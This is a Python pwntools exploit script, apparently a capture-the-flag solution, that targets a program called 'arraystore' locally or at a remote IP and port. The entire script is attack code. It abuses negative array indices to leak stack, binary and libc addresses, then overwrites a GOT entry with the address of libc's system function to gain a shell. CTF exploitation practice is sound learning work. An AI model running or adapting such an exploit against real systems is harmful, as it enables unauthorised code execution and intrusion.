#!/usr/bin/python3

from pwn import *

exe = ELF('arraystore_patched', checksec=False)
libc = ELF("libc6_2.35-0ubuntu3.1_amd64.so")
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                # b*main+158
                b*main+121
                b*main+381
                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('34.124.157.94', 10546)
else:
    p = process(exe.path)

GDB()


sla(b"Read/Write?: ", b"R")
sla(b"Index: ", b"-7")
p.recvuntil(b"Value: ")
stack_leak = p.recvline(keepends=False).decode()
info("stack leak: " + str(stack_leak))

sla(b"Read/Write?: ", b"R")
sla(b"Index: ", b"-3")
p.recvuntil(b"Value: ")
exe_leak = p.recvline(keepends=False).decode()
info("exe leak: " + str(exe_leak))
exe.address = int(exe_leak) - 8245
info("exe base: " + hex(exe.address))

puts_plt = (int(stack_leak)-800 - exe.got['puts'])//-8
sla(b"Read/Write?: ", b"R")
sla(b"Index: ", str(puts_plt))
p.recvuntil(b"Value: ")
leak_libc = int(p.recvline(keepends=False))
libc.address = leak_libc - libc.sym['puts']
info("libc base: " + hex(libc.address))

sla(b"Read/Write?: ", b"W")
sla(b"Index: ", b"0")
sla(b"Value: ", b"0")

sla(b"Read/Write?: ", b"R")
sla(b"Index: ", b"0")

sla(b"Read/Write?: ", b"W")
sla(b"Index: ", str(puts_plt+5))
sla(b"Value: ", str(libc.sym['system']))

p.interactive()
